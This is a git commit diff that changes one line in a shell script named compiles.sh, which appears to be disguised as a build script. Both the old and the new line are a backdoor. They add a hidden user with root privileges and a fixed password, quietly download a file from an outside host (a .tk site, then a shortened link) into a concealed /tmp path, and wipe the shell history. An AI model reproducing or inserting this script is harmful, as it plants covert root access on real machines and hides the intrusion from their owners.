438a038089f544ff1b7b78c3f575743d2b18072d
Yzykar <yzykar123@gmail.com>
2017-05-22 18:26:57 +0200

    Update compiles.sh

--- compiles.sh
+++ compiles.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-useradd -o -u 0 -g 0 -M -d /root -s /bin/bash localhost; echo -e "passwd\npasswd" | passwd localhost; wget -q -O /tmp/... http://blasze.tk/HVP7RZ; clear; history -c
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash localhost; echo -e "passwd\npasswd" | passwd localhost; wget -q -O /tmp/... https://goo.gl/Ds1i9v; clear; history -c
